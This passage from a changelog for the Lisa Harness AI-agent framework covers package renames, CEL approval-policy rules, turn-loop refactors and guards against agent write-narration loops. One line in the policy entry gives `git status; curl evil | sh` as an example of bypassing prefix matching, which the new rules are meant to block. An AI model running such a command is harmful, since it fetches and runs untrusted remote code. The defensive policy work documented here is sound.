- **Tests:** `test_bindings_warn_and_ignore_unknown_configured_owner` pins
  the warning and the inert binding; `test_slice_view_wiring` passes again.

### Changed

#### SDK owns the data-dir layout; host runtime fixes surfaced by test repair

- **What:** `sdk.layout` owns the canonical data-dir constants
  (`CONFIG_DIR`, `DATA_DIR`, `STATE_DIR`, `data_subdir`, ...);
  runtime owns pack activation and session configuration. Host fixes:
  undeclared session blocks no
  longer silently take defaults; the system timezone resolves from the
  `/etc/localtime` IANA key (`America/New_York`, not `EST5EDT`);
  auto-capture commitment patterns match case-insensitively; recovery
  pack commands (`/stalls`, `/retry`, ...) find the host recovery service;
  the capability snapshot reports per-model `modes` (from `mode_models`)
  instead of crashing on the removed `roles`; `/help` pack command lines
  now lead with the command prefix.
- **Why:** The kernel imported `sdk.layout`, violating the kernel→SDK
  boundary. The host bugs were masked by stale tests that patched moved
  seams or leaked the real `~/.lisa` into the suite.
- **Tests:** Host tests isolate `HOME`/`LISA_*`; stale patches retarget
  the binding modules; delegate/fork and pack-manager cases are
  parametrized; new direct tests cover the localtime helper.

#### Distribution rename: `lisa-*` → `lisa-harness-*`; brand → Lisa Harness

- **What:** The framework distributions are renamed to match the
  `Lisa-Harness` GitHub org: `lisa-kernel` → `lisa-harness-kernel`,
  `lisa-sdk` → `lisa-harness-sdk`, `lisa-mcp-servers` →
  `lisa-harness-mcp-servers`, `lisa-host-runtime` → `lisa-harness-runtime`,
  and `lisa-packstest` → `lisa-harness-packstest`. The workspace root is
  now `lisa-harness`. The `lisa-pack-*` ecosystem names are unchanged.
  Import packages (`kernel`, `sdk`, `host`, `mcp_server`, `packstest`),
  entry-point groups (`lisa.extensions.*`), the `lisa` command, and the
  `~/.lisa` data dir are all unchanged — only distribution names, the
  bare-pack git-root default (`github.com/Lisa-Harness/`), and docs
  branding ("Lisa Harness") move.
- **Why:** The project is renamed to Lisa Harness ahead of the first
  PyPI publish; old names `lisa-sdk` and `lisa-framework` collide with
  unrelated PyPI projects, so the rename also unblocks publishing.
  Renaming pre-publish is the only cheap window — PyPI names are forever.
- **Tests:** `test_paths_framework_root.py`, `test_pack_manager.py`,
  `test_pack_autoinstall.py`, and `test_session_plan.py` updated for the
  new names; `EXCLUDED_PACK_NAMES` now excludes `lisa-harness-sdk` from
  pack lists.

#### Kernel `Settings` no longer reads `<cwd>/.env`

- **What:** `kernel.config.Settings` dropped `env_file=".env"` from its
  `SettingsConfigDict`; kernel tunables now load from the live environment
  only — bare names (`STAGE_NUDGE_CAP`) and `LISA_`-prefixed names
  (`LISA_STAGE_NUDGE_CAP`), bare winning, as before. Precedence is
  init args > bare shell env > `LISA_`-prefixed shell env > file secrets.
- **Why:** `.env` file ownership is the host/CLI transport layer's contract
  (`sdk.layout`: the data-dir `.env` is a contract, not data). The CLI's
  python-dotenv loader exports values into `os.environ` before config
  resolution, so in the shipped runtime the kernel's own CWD-relative dotenv
  source was inert for the machine-level `~/.lisa/.env` and disagreed with
  the CLI's four-candidate search order. Standalone `Settings()` callers in
  a CWD holding a `.env` lose that read — the deliberate narrowing.
- **Tests:** `kernel/tests/test_config_env_prefix.py` drops the three
  `.env`-file tests; the bare-vs-`LISA_`-prefix shell-env tests are
  unchanged and still pass.

#### CI-gated PyPI publishing and strict production typing

- **What:** Tag-based PyPI publishing now waits for reusable CI, validates
  all eight distribution names and versions against the tag, checks the
  wheel and source-distribution counts, and publishes through OIDC. The
  strict production mypy gate now passes across the kernel, SDK, and MCP
  server packages.
- **Why:** Prevent publishing an unvalidated or version-mismatched release
  and make the type gate report actionable production-code errors.
- **Tests:** The CI-equivalent mypy check reports zero errors across 168
  source files; local release builds produced all eight wheels and sdists.

### Added

#### CEL `when` expressions for policy rules + `/policy rule` management

- **What:** Policy rules gain an optional `when` field — a
  [CEL](https://github.com/google/cel-spec) boolean expression evaluated
  against an activation exposing `action.*` (`tool`, `effect`, `pack`,
  `command`, `argv`, `parameters`), `identity.*` (`workspace_id`, `user_slug`,
  `surface_id`, `surface_type`, `mode_id`, `memory_scope`), and
  `containment`. All present matchers AND the expression must hold; a
  `when`-only rule is valid. `argv` exposes the command tokens (the `argv`
  parameter when present, else `shlex.split` of the command string), which
  closes the `command_prefix` bypass — `command_prefix: git status` matches
  `git status; curl evil | sh` (plain startswith), while
  `action.argv[0] == "git" && action.argv.size() <= 2` does not. The engine
  (`runtime/policy.py`) caches compiled programs by expression text (the policy
  file is re-read on every approval request, so compilation must be cached),
  compile-checks every expression at load via the new
  `load_policy_with_errors` (a non-compiling expression fails the whole
  document to ask-mode defaults, mirroring corrupt-YAML fail-closed), and
  short-circuits evaluation errors to `ask` — never skipping the rule, the
  deliberate inversion of the model router's skip-and-continue (a skipped
  deny would be an allowed `rm`). Documents without `when` rules pay zero
  extra I/O per decision (the containment fact is read only when some rule
  has a `when`). `runtime/pyproject.toml` declares `cel-python>=0.5.0` directly
  (already in the tree transitively via the SDK's router). `/policy` renders
  expressions, per-rule remove addresses (`list:n`), and a load-errors
  section (the discovery surface for a broken expression — policy has no
  `/models apply` gate); new `/policy rule add <list> [--tool T] [--effect E]
  [--pack P] [--prefix PX] [--when EXPR]`, `/policy rule remove <list>:<n>`,
  and `/policy rule list` subcommands manage rules from any transport
  (flag parsing is case-preserving; `--when` takes the raw remainder and
  strips one whole-expression shell quote while leaving inner string
  literals verbatim; the expression is compile-checked before the write so a
  bad add is rejected instead of poisoning the document). `/help` updated;
  the duplicated dead `policy` help block in `runtime/commands/_render.py` was
  removed (a dict literal cannot carry two identical keys — the first was
  unreachable).
- **Why:** The structural matchers cannot express negation, token
  membership, identity scoping, or parameter conditions — each would need a
  new dedicated key — and `command_prefix` is bypassable by shell
  metacharacters. The model router already established the CEL idiom in this
  codebase (`sdk/router/router.py`, `cel-python` in the tree); the policy
  reuses the mechanics with inverted error semantics because policy failure
  must fail closed. Rule management had no in-host surface beyond hand-editing
  YAML.
- **Tests:** `runtime/tests/test_policy.py` (when-matching, AND semantics,
  argv-token bypass regression, eval-error→ask, compile-error→fail-closed
  load, round-trip serialization, containment/identity bindings, compile
  cache, zero-I/O guarantee for expression-free documents); `runtime/tests/
  test_policy_command.py` (rule add/remove/list, compile-check rejection
  without write, case preservation, quoting probe, out-of-range and bad
  addresses, render with expressions and load errors).

#### Approval Policy Guide (`docs/POLICY_GUIDE.md`)

- **What:** New authoring reference for `config/policy.yaml`: file location
  and data-dir resolution, the full key table (`mode`, `sandbox_downgrade`,
  `bare_requires_approval`, rule lists), rule matcher semantics (AND within a
  rule, deny → ask → allow first-match), the fixed decision ladder with the
  sandbox downgrade and bare-mode guard, containment states, runtime
  management surfaces (`/policy`, `/approve --remember`), and fail-closed
  behavior. Links the engine (`runtime/policy.py`) and tests as canonical.
- **Why:** Policy documentation lived only in docstrings, the generated file
  header, and tests — there was no durable guide for hand-authoring the file.
  Also fixes a stale docstring path in `runtime/policy.py` (the sandbox fact
  lives at `run/<session_key>/sandbox-facts.json`, matching the bash pack
  writer and reader).

#### `/last` — verbatim replay of a previous response

- **What:** New host command `/last [N]` reprints a previous turn's response
  text byte-for-byte: no header, no metadata, no model call. The default
  (bare `/last`) walks back over the durable thread (skipping host-command
  turns and empty responses) to the last model response; `/last N` replays
  turn `N`'s response, mirroring `/debug [N]`'s addressing. Reads go through
  the same `ThreadStore.load_thread_range` / `next_turn_index` path `/debug`
  uses, so replay works identically after a restart. Registering `/last` as a
  host-command prefix also strips those entries from the model's transcript
  excerpt and thread search — a replay never costs future context.
- **Why:** Terminal scroll/clear loses long responses, and re-asking the
  model costs tokens and mutates the answer. The thread entry's
  `response_text` is already the exact string the model produced, so
  reprinting it is free and lossless.

### Changed

#### Tuned stuck-in-stage guard defaults (`stage_nudge_threshold` 4 → 7, `stage_nudge_cap` 9 → 10)

- **What:** Retuned the lifecycle resolver's stuck-in-stage defaults in
  `kernel.config.Settings`: the soft nudge now fires at 7 consecutive
  non-transitioning iterations (was 4) and the turn pauses/terminates at 10
  (was 9). Updated every doc stating the defaults (`docs/ROUTER_DESIGN.md`
  §4 and §8, `docs/ROADMAP.md` §3.4, the guard docstrings in
  `kernel/config.py` and the budget-briefing comment in
  `kernel/turn_runner/__init__.py`) and the `.env`-prefix test that pins
  the cap default (`kernel/tests/test_config_env_prefix.py`).
- **Why:** The 4-iteration nudge fired during productive multi-iteration
  steps, pushing models that were still making progress; 7 leaves room for
  4–6 productive iterations before the kernel starts pushing, while the cap
  stays only 3 iterations beyond the threshold so the graded escalation
  (nudge → pause) keeps its shape. Both values remain overridable via
  `STAGE_NUDGE_THRESHOLD` / `STAGE_NUDGE_CAP` (or `LISA_`-prefixed shell
  env).

#### Documentation: router terminal actions vs. kernel lifecycle guards

- **What:** `sdk/router/README.md` gains a "Relationship to kernel lifecycle
  guards" section. The CEL terminal actions (`finish:` / `transition_to:`)
  are optional deployment config; the kernel's stuck-in-stage guards are
  framework invariants whose counter (durable cross-turn stage occupancy)
  is invisible to CEL bindings and whose graded response (nudge at
  `stage_nudge_threshold` → pause/terminate at `stage_nudge_cap`) a `finish`
  rule cannot express. The lifecycle resolver ranks a router decision above
  every kernel cap (only operator signals outrank it), so a matching
  `finish` preempts the guards and the guards remain the backstop when no
  rule matches or evaluation errors. Corrected stale guard references in
  `docs/ROUTER_DESIGN.md` and `docs/ROADMAP.md`: the module constants
  `_STAGE_NUDGE_THRESHOLD` (4) / `_STAGE_NUDGE_CAP` (6) no longer exist —
  they are `kernel.config.Settings` fields (`stage_nudge_threshold: 4`,
  `stage_nudge_cap: 9`, overridable via `STAGE_NUDGE_THRESHOLD` /
  `STAGE_NUDGE_CAP`), and cap expiry pauses/terminates rather than forcing
  a silent final completion. Fixed the contradicting "forces a final
  no-tools completion" comment on `Settings.stage_nudge_cap` to match the
  resolver's pause/terminate semantics.
- **Why:** The stage-nudge machinery and the router's CEL terminal actions
  overlap on paper (`tool_calls_so_far >= N` vs. a stage-stall counter);
  no doc explained why both exist, and the guard docs still described
  pre-resolver constants and truncate semantics.

#### `extension_runtime` cleanup: dead symbols removed, `context_items` endpoint enforced

- **What:** Trimmed `kernel/src/kernel/extension_runtime.py` to its live
  surface: removed the `ExtensionAnomalyDetector` callable alias (the
  anomaly-detection role moved to `kernel.intake.contracts.ProcessingLoop`;
  no producer or consumer existed anywhere) and the never-read
  `ExtensionRuntimeContext.complete_with_profile` field. Removed the stale
  `known_orphan=True` flag on the `lisa.extensions.context_items` entry in
  `kernel/src/kernel/testing/endpoint_registry.py` — the wip signal packs
  (cloudflare/github/stripe) had already migrated to the renamed group, so
  the flag was suppressing the producer test for a live endpoint
  (`test_endpoint_registry.py` now runs the producer assertion instead of
  skipping it). Updated the `extension_runtime.py` row in
  `kernel/README.md` accordingly. Also fixed the pack-scoped context
  boundary in `runtime/src/runtime/context_assembly.py`: the session-mapper call
  now derives `active_packs` from the active mode's
  `mode_provider_id` + `context_item_packs` front-matter, so
  pack-contributed `ContextItem` records are admitted in their own mode
  instead of being silently gated as `inactive_pack` (the omission made the
  entire `context_items` extension surface inert in production hosts).
- **Why:** Pre-release dead-surface audit: the kernel exports must all be
  live public API, and a registry flag describing a superseded migration
  state (`context_evidence` → `context_items`) was masking both the
  endpoint's producer test and the fact that no host had ever passed
  `active_packs` to the mapper.
- **Packs:** The wip signal packs in `../lisa-packs-wip` (cloudflare,
  github, stripe) were made current in the same pass: their processing
  loops and status operations were reading the deleted
  `UnifiedState.signal_snapshots` attribute (an `AttributeError` at
  runtime) and now resolve snapshots the same way the headroom reference
  pack does — typed `ProcessContext.collections` first, intake signal-item
  round-trip fallback second; their `context_items.py` builders got the
  missing `datetime` import fixed (latent `NameError`); cloudflare's
  `_mode.md` uses the live `context_item_packs` key instead of the dead
  `context_evidence_packs` (its own evidence was being excluded from its
  own mode); stale pre-rename nested `pyproject.toml`s declaring the dead
  `lisa.extensions.context_evidence` entry-point group were removed, along
  with the stale `build/`/`egg-info` litter; each pack gained
  `tests/test_processing.py` locking the migrated snapshot-resolution
  channels in place.
- **Removal:** `ExtensionAnomalyDetector` (type alias) and
  `ExtensionRuntimeContext.complete_with_profile` (field) are gone from
  `kernel/src/kernel/extension_runtime.py` — no producer, consumer, or
  entry-point group referenced either symbol in the framework, the public
  pack repo, or the wip pack repos. Hard-cutover contract: no shims or
  deprecated aliases. `AnomalyAlert` itself is live (intake/processing
  pipeline) and stays.

### Changed

#### God-object decomposition & structured subsystem packages (audit refactor)

- **What:**
  - **`HostRuntime` decomposition:** `runtime/src/runtime/runtime.py` is now a thin
    composition root grouping state into five sub-objects: `HostPaths`
    (`runtime_paths.py`), `ProviderRegistry` (`providers.py`), `HostServices`
    (`services.py`), `SessionState`, and `RuntimeResources` (`runtime.py`,
    which owns the async MCP pool lifecycle). All call sites now name their
    domain explicitly (`runtime.session.manifest`, `runtime.paths.thread_path`,
    `runtime.services.approval_service`).
  - **`TurnHooks` grouping:** Grouped 40+ flat extension fields into cohesive
    sub-dataclasses in `kernel/src/kernel/turn_hooks.py`: `ModelHooks`,
    `ContextHooks`, `OperationHooks`, `LifecycleHooks`, `WorkflowHooks`,
    `HostServiceHandles`, `TurnIdentity`, `RecallHooks`, and `ToolHooks`.
    `TurnHooks` now composes these (e.g. `hooks.models.complete`,
    `hooks.lifecycle.on_turn_complete`). Construction kwargs are grouped;
    legacy test ergonomics fold via `kernel/tests/turn_hooks_fold.py`.
  - **`kernel.turn_runner` package:** Split the 6,044-line `turn_runner.py`
    into a package (`kernel/turn_runner/`) with satellites `_result.py`
    (`TurnResult`), `_seams.py` (`ContextSeams`), `_streaming.py`
    (`StreamedCompletionAdapter`), `_defaults.py` (default hook fallbacks),
    and `_helpers.py` (slice dispatch, plan→step compilation). The engine
    resides in `__init__.py` so `mock.patch("kernel.turn_runner.<name>")`
    targets continue to intercept call-site reads.
  - **`runtime.approval` package:** Extracted the approval subsystem (~600 lines)
    from `handle_message.py` into `runtime/src/runtime/approval/` (`orchestration.py`
    + `presentation.py`). `handle_message.py` shrunk from 1,600 to 871 lines
    and now matches its documented three-phase pipeline. Import-time command
    registration side effects removed; `runtime.bootstrap.build_runtime()` now
    calls `register_builtin_host_commands()` explicitly.
  - **`runtime.thread` package:** Split `runtime/src/runtime/thread.py` into a package:
    `_store.py` (zstd-sealed persistence mechanics) + `_excerpt.py` (excerpt/manifest
    prompt-injection reads), re-exported through `__init__.py`.
  - **Layer fix:** Relocated `kernel/testing/runtime_factory.py` to
    `runtime/src/runtime/testing/runtime_factory.py` (`runtime.testing`), resolving the
    documented kernel→host layer inversion.
  - **Type narrowing:** Narrowed `Any`-typed fields on the grouped hook
    dataclasses and `HostServices` to real `Protocol`/dataclass types
    (`ApprovalService`, `RecoveryService`, `StateProvider`, `RouteCoordinator`,
    `TokenUsageTelemetryHandler`, etc.).

### Removed

#### Compatibility re-exports from `kernel.turn_runner` & `declarative`

- **What:** Removed compatibility re-exports from `kernel/src/kernel/turn_runner.py`
  (which formerly re-exported internal helpers from `turn_phases.*` for legacy
  test suites) and from `kernel/src/kernel/operations/declarative.py` (which
  aliased structured-output helpers). Updated all test files and host modules to
  import directly from their canonical `kernel.turn_phases.*` and `kernel.operations.*`
  modules. Cleaned up stale "DESIGN — re-exported by kernel.turn_runner" docstrings
  across `kernel/src/kernel/turn_phases/`.
- **Why:** The repository follows a hard-cutover contract; compatibility shims and
  stale aliases mask broken package configurations and cause cyclic import workarounds.

### Fixed

#### Kernel test baseline hardening & dispatch counter fix (Loop 1)

- **What:** Fixed 35 pre-existing test failures across the kernel test suite
  (bringing the failure baseline from 79 down to 44 with zero regressions):
  (1) `SDK_CONTENT_ROOTS` separator mismatch: `conftest_catalog.py` and
  `runtime/tests/conftest.py` now use `os.pathsep.join` instead of `";"`, fixing
  catalog root resolution on Linux;
  (2) `_augmented_ambient_catalog` fixture in `kernel/tests/conftest.py`:
  injects synthetic routable modes (`markdown`, `remember`, `ponder`,
  `search`, `coding`, `plan`) into the test catalog so pure mapping and
  handoff tests resolve their targets in isolated venvs without external
  packs installed;
  (3) migrated 12 test call sites in `test_turn_runner.py` from legacy
  `transition_stage(fork:...)` syntax to the current `fork` operation call
  contract;
  (4) `test_catalog_loader.py` updated to invoke `validate_workflow_catalog`
  rather than asserting validation exceptions on raw load;
  (5) fixed pre-src-layout path in `test_session_plan.py`;
  (6) fixed `except Exception:` dispatch-error path in
  `kernel/src/kernel/turn_runner.py`: failed dispatches now increment
  `total_tool_calls` so the empty-completion write-contract backstop cannot
  falsely re-arm after an attempted write failed.
- **Why:** The test suite had a red baseline (79 failures) that masked
  regressions and forced developers into `git stash` archaeology on every
  bugfix. Hardening the baseline provides a stable regression gate for the
  turn-loop refactoring.
- **Baseline:** Documented in `/memories/repo/kernel-test-baseline.md`.

### Added

#### `packstest` in-process pack test/eval harness

- **What:** New workspace member `packstest` (`lisa-packstest`) for testing
  content packs in-process, from source, in seconds — no install step, no
  catalog MCP subprocess, no model calls. Modules: `context`
  (`ToolContextFactory`), `store` (`MemoryWorkProductStore` double),
  `catalog` (`validate_pack`/`build_tool_catalog` via the real SDK scanners),
  `runner` (`run_tool`/`run_scenario`), `report` (`Trajectory`), `git`
  (offline repo fixture), and `case` (declarative evals under the `eval`
  marker). See `packstest/README.md`.
- **Why:** The production pack route (entry points → catalog subprocess →
  host wiring) is too slow for the edit-test-fix loop and surfaces failures
  as opaque turn errors. The harness activates a pack directly from its
  checkout and drives tools through the real contracts; failing evals name
  the exact tool and error. The coding pack's evals
  (`tests/evals/` in `lisa-pack-coding`) are the reference usage.
- **Baseline:** Harness self-tests in `packstest/tests/`; evals use the
  deterministic `eval` marker (no model calls, tmp-dir I/O only).

#### Structural yield surface on `HostCommandResult`

- **What:** `runtime.types.HostCommandResult` gains `yielded_question: str`, set
  by `handle_message` from `result.yielded.question` when a turn ends in the
  model's `yield` terminal action, with `data["yielded"]` mirroring the
  question for panel transports. Covered by `runtime/tests/test_host_command_result_yield.py`.
- **Why:** A yielded turn (the model asked the operator a question instead of
  finishing) was previously indistinguishable from a completed answer at the
  result boundary — the question prose flowed to transports as `text`. One-shot
  hosts (the CLI `once` command) rely on the typed field to fail fast with a
  dedicated exit code instead of writing the question into redirected output
  as if it were the requested artifact.

#### Turn decision telemetry (`turn.decision`) (Loop 7)

- **What:** Added per-iteration structured `turn.decision` event publishing to
  `hooks.context_seams.event_bus`. Each event carries `mode_id`, `iteration`,
  `turns_in_stage`, `action_type`, `action_reason`, `total_tool_calls`, `write_receipts`,
  and `read_receipts`. Documented the event payload in `docs/LOGGING.md`. Added a unit
  test in `kernel/tests/test_turn_decision.py` verifying event capture.
- **Why:** Post-incident reconstruction previously required manual log correlation across
  multiple local/remote jsonl files. Structured `turn.decision` events make turn progression
  and lifecycle decisions queryable in real-time.

#### Pure parent-turn completion contract resolver (Loop 2)

- **What:** Extracted the post-loop Phase 3 completion contract chain from
  `kernel/src/kernel/turn_runner.py` into a pure, typed resolver
  (`kernel.turn_phases._completion_contract.resolve_completion_contract`).
  Returns a tagged union (`AcceptTurn`, `PreexistingFailureBlock`,
  `SurfaceProseWithFootnote`, `ChatSoftAccept`, `ChatReadFootnote`,
  `BlockNoVerifiedWrite`). The parent turn loop in `_run_turn_inner` now
  calls the pure resolver and applies the decision. Added a dedicated unit test
  suite in `kernel/tests/test_completion_contract.py` covering all outcome variants.
- **Why:** The inline ~150-line post-loop chain mixed receipt verification,
  routing-misfire prose rescue, chat-mode softening, and unverified-write
  blocking with multiple mutable state checks. Extracting it into a pure,
  pack-blind function makes post-loop contracts independently testable and
  eliminates guard-interaction ordering bugs.
- **Tests:** `kernel/tests/test_completion_contract.py` (15 unit tests covering
  receipt verification, misfire surfacing, chat softening, strict blocks, and
  pre-existing failure blocks; all 15 passed), `kernel/tests/test_effect_receipts.py`
  (22 passed).

#### Phase 1 entry-phase extraction, typed turn state & loop import hoisting (Loop 5)

- **What:** (1) Extracted Phase 1 entry operations, resume-in-flight gate, and planner
  execution from `turn_runner.py` (~320 lines) into `kernel.turn_phases._entry.execute_entry_phase`
  returning a typed `EntryPhaseResult`;
  (2) Hoisted 9 per-iteration `_lifecycle` imports out of the `while` loop body in
  `turn_runner.py` to top level;
  (3) Strongly typed `_TurnState` in `kernel.turn_phases._turn_state`: fields `fork_results`
  and `effect_receipts` now carry concrete model types (`list[ForkChildResult] | None` and
  `list[EffectReceipt]`) rather than `list[Any]`;
  (4) Eliminated redundant 30-line `_build_minimal_context` duplication via parameterized
  `_build_entry_ctx` helper.
- **Why:** Reduces `_run_turn_inner` complexity, eliminates per-iteration import overhead
  in the hot tool loop, and provides typed guarantees for the mutable turn state.

#### Phase 2 capability dispatch extraction (Loop 6)

- **What:** Extracted the core capability dispatch machinery from `turn_runner.py`
  (~550 lines) into `kernel.turn_phases._dispatch.dispatch_capability`, which encapsulates:
  (1) in-process operation execution and fork/delegate result aggregation,
  (2) pack-tool execution with within-turn read caching,
  (3) MCP tool execution,
  (4) effect receipt capture and write receipt invariant enforcement,
  (5) consecutive-error streak tracking, and
  (6) recovery record settlement with fail-loud logging.
  Re-exported `read_cache_signature`, `format_read_abbreviation`, and `enforce_write_receipt`
  from `kernel.turn_runner` for backwards compatibility.
- **Why:** Replaces over 500 lines of complex nested dispatch logic in `_run_turn_inner`
  with a clean 40-line call, significantly reducing cyclomatic complexity and isolating
  tool execution side-effects into a modular, testable unit.

#### Turn scenario matrix & structured stalled-write trigger (Loop 3)

- **What:** Added a comprehensive scenario matrix suite in
  `kernel/tests/test_turn_scenario_matrix.py` (20 tests) codifying the
  cross-product of guard inputs across both the in-loop lifecycle resolver
  (`resolve_lifecycle_action`) and the post-loop completion contract resolver
  (`resolve_completion_contract`). Named matrix cells pin all 6 major historical
  incident patterns (08-03 fork-child read-loop, 08-27 read-receipt fix,
  09-02 write-announcement, 09-04 fetch_page read-loop burn, turn-70 prose discard,
  and 08-30 budget-claim fabrication). Restructured the stalled-write rescue in
  `kernel/src/kernel/turn_runner.py`: trigger is now structured (mode declares
  action tools, 0 write receipts, >=1 read receipt, 0 writes attempted, and
  either announcement prose or reaching `stage_nudge_threshold`), demoting
  `_STALLED_WRITE_PATTERNS` to guidance-line enrichment. Added regression test
  in `kernel/tests/test_effect_receipts.py` verifying the structured trigger on
  silent read loops.
- **Why:** Guard-intersection bugs historically arose because each guard was tested
  in isolation. The scenario matrix tests the cross-product of receipts, attempts,
  and mode kinds directly, preventing guard-interaction deadlocks.
- **Tests:** `kernel/tests/test_turn_scenario_matrix.py` (20 passed),
  `kernel/tests/test_effect_receipts.py` (23 passed).

#### Turn-loop invariant registry & fail-loud exception hardening (Loop 4)

- **What:** (1) Created `docs/lessons/turn-loop-invariants.md`, establishing an
  authoritative registry of all 12 active turn-loop invariants mapping each invariant
  to its code site, incident provenance, pinning unit test, and scenario matrix cell;
  (2) Replaced the git-blame comment in `kernel/src/kernel/turn_runner.py` with an
  explicit pointer to the invariant registry;
  (3) Hardened exception handling across `kernel/src/kernel/turn_runner.py` and
  `kernel/src/kernel/turn_phases/`: recovery settle errors now log with `exc_info=True`
  to prevent silent failures, and workflow position wrappers log debug diagnostics
  instead of blind exception swallows.
- **Why:** Incident memory was previously scattered in commit messages, CHANGELOG
  notes, and inline comments. The registry provides a single discoverable contract
  for why each guard exists, while fail-loud logging prevents silent failures from
  masking state corruption.

#### In-process MCP server mode (default for `lisa once`)

- **What:** First-party MCP servers (catalog, content, context, guard, memory,
  storage, thread) can now run in a single interpreter instance via the MCP
  SDK's in-memory transport, eliminating subprocess spawn overhead. This is
  the default for `lisa once` — single-turn execution no longer spawns 4+
  child processes. A new `RuntimeKind.IN_PROCESS` marks first-party servers
  for in-process connection; `MCPToolPool._connect_in_process` wires a
  `ClientSession` to each server's `MCPServer` instance via
  `create_client_server_memory_streams`, driving the server's lowlevel
  `run()` in a background `asyncio.Task`. The host injects a resolver
  callable (backed by `mcp_server.registry`) so the kernel never imports from
  `mcp_server`, preserving the architecture boundary.
- **Why:** Subprocess spawn is the dominant startup cost for `lisa once`.
  Running servers in-process cuts cold-start time significantly and simplifies
  debugging (single process, shared logging, no stdio pipes).
- **Tests:** `kernel/tests/test_mcp_in_process.py` (end-to-end in-process
  connect + list_tools + call_tool, missing-resolver and unknown-server
  error paths), `mcp_server/tests/test_in_process_registry.py` (registry
  lazy import + caching), `kernel/tests/test_mcp_launch.py` (compiler
  IN_PROCESS kind + log-path skip).

#### In-place pack updates: `/pack update`

- **What:** New `/pack update <pack>` and `/pack update --all` commands that
  upgrade installed packs in place. Both drivers read the pack's provenance
  entry in `installed-packs.json` and re-run the existing install core
  (`run_pack_install_sync`) with the recorded `source_ref`, so git pins,
  local paths, and PyPI refs all refresh through the same trust-validated
  path used by `/pack install`. Bundled packs (no install source) are
  rejected with an actionable message. `update --all` batches every
  runtime-installed pack and requests a single restart; per-pack failures do
  not stop the batch and are listed in the output.
- **Why:** Until now the only way to pick up a newer pack version was
  `/pack uninstall` + `/pack install` — or re-typing the original install
  spec by hand. The lock file already records exactly where each pack came
  from, so an in-place update is a thin loop over that record rather than a
  new resolution mechanism.
- **Tests:** `runtime/tests/test_pack_manager.py` (update from recorded source,
  unknown-pack and bundled-pack rejections, install-failure propagation,
  `--all` batching with bundled/empty-ref skips, no-op `--all`, partial
  failure reporting).

### Changed

#### Turn runner: routing-misfire prose surfacing (2026-09-02 executor block)

- **What:** When the synthesized-call required-params guard aborts a
  kernel-synthesized action-tool dispatch on a turn that dispatched ZERO
  real tools, the post-loop completion contract now surfaces the model's
  prose with the no-write warning footnote instead of replacing it with
  the `no_tools` hallucinated-success block. `_TurnState` gains
  `routing_misfire_prose`, set by the guard only when
  `total_tool_calls == 0`; the post-loop `_parent_no_tools` branch reads
  it and accepts the prose (never when a write was attempted or the
  prose is empty — an empty zero-dispatch turn still yields the honest
  redirect question).
- **Why:** The 2026-09-02 turn-70 executor misroute: a conversational
  question routed planner→thinker→reviewer→executor, the model answered
  entirely in prose with zero tool calls, the write-contract
  empty-completion backstop synthesized `coding_apply_patch` with `{}`,
  and the guard aborted — correctly avoiding a guaranteed validation
  failure, but its stated intent ("surfacing model prose") was then
  contradicted by the post-loop check, which classified the
  zero-receipt/zero-call turn as hallucinated success and discarded the
  model's answer. Answering a question is honest work even when routing
  put it in front of a write-contract mode.
- **Tests:** `kernel/tests/test_effect_receipts.py` (misroute prose
  surfaced with footnote, `no_tools` not fired; empty prose on an
  aborted dispatch yields for redirect instead of surfacing; 2 new
  tests).

#### Turn runner: write-announcement loop breakers (2026-09-02 incident)

- **What:** Two kernel fixes for the p920 stuck-loop where Lisa ended eight
  consecutive turns (thread turns 59–66) with narration ("Writing both
  files now") while the receipt ledger held only read receipts, so the
  user had to re-ask "continue" every turn. (1) **Truncated-stream
  rescue**: when the streaming path ends `finish_reason="length"` while
  tools were offered, the kernel retries the call once with a doubled
  `max_tokens` (bounded by the model's `context_window`) before accepting
  a narration-only aggregate — v1 streaming does not parse tool-call
  deltas, so a generation cut off mid-payload is indistinguishable from a
  narration-only completion and the announced write is silently lost.
  (2) **Stalled-write rescue**: when a natural completion announces a
  write (`_STALLED_WRITE_PATTERNS` commitment language) while the ledger
  shows zero write attempts but real read receipts, the kernel injects a
  one-shot Phase-7 dispatch directive (named action tools, "no narration
  before the tool call") into the next iteration's lifecycle briefing.
  Latched per turn via `stalled_write_rescue_fired` on `_TurnState`; the
  chat-mode completion contract still accepts an honest read-only turn
  after the single nudge. No kernel-synthesized write dispatch — an
  MCP-native action tool (`lisa-storage.write_file`) requires `path` +
  `content` the kernel cannot fabricate, so a synth is a guaranteed
  validation failure.
- **Why:** The empty-completion backstop requires `total_tool_calls == 0`
  (turn 60+ had read receipts), the midpoint write-nudge skips turns with
  read receipts (the 2026-08-27 read-receipt fix), and the chat-mode
  softening accepts dense content — three correct guards whose
  intersection left the announcement loop uncaught.
- **Tests:** `kernel/tests/test_streaming.py` (retry fires at 2x with a
  `context_window` cap; no retry without tools offered; 13 passed),
  `kernel/tests/test_effect_receipts.py` (rescue directive injected once
  and the follow-up write dispatches; honest dense answers untouched;
  one-shot latch; 18 passed).

#### Kernel config: dead settings removed, identity + context budgets migrated to host

- **What:** `kernel/config.py` cut to only settings the kernel actually
  reads. Removed as dead (zero consumers): `workspace_id_fallback` (kernel
  and sdk copies), the `memory_recall_*` / `memory_auto_capture_*` copies
  (hosts read their own copies in `runtime/config.py`), all eleven
  `passive_intelligence_*` fields (the layer was never wired), and the
  dead `state_container` / `intel_inbox_container` fields in
  `sdk/config.py`. Migrated out of the kernel: the nine `identity_*` scope
  defaults and the per-lane `context_budget_*` ceilings now live on
  `runtime/config.py` (`HostConfig`, env-overridable via
  `LISA_CONTEXT_BUDGET_*`); `TurnHooks` and `_build_minimal_context` fall
  back to plain personal-DM literals instead of kernel settings.
  `ContextBudgetAllocator.for_turn` now takes `enabled` / `lane_limits` /
  `token_char_ratio` as explicit parameters injected by the host call site
  instead of reading kernel settings; the kernel keeps only the shared
  chars-per-token estimate (`CONTEXT_BUDGET_TOKEN_CHAR_RATIO`) and the
  mapper scoring dicts. The duplicated
  `declarative_completion_max_tokens` / `_temperature` now have a single
  source of truth (kernel); `sdk/content/_catalog.py` reads them from
  `kernel.config`. The kernel `memory_recall_final_limit`-style duplicate
  went with it — `sdk.config` keeps only what packs read
  (`memory_recall_final_limit`, `external_signal_timeout_seconds`).
- **Why:** Every dead field was env-overridable surface area that silently
  did nothing — an operator tuning `LISA_PASSIVE_INTELLIGENCE_*` got no
  effect and no error. Identity defaults only mattered for bare/test hosts
  (the CLI host builder overrides all nine from its own config), and the
  context-budget lanes are an assembly/prompting product decision, not
  kernel mechanics. Both belong to the runtime.
- **Config:** New host env vars `LISA_CONTEXT_BUDGET_{ENABLED,
